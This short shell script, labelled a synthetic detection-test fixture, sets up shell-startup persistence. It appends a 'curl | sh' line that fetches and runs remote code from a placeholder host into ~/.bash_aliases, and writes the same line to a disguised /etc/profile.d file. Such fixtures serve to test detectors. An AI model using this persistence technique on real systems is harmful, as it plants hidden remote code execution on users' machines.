#!/bin/sh
# FIXTURE ONLY - synthetic detection test sample, not real malware
# Shell-startup persistence through ~/.bash_aliases (sourced by the default ~/.bashrc) and a new
# file in /etc/profile.d (sourced by every login shell).
echo 'curl -s https://payload.invalid/b | sh' >> "$HOME/.bash_aliases"
echo 'curl -s https://payload.invalid/b | sh' > /etc/profile.d/00-perfhelper.sh
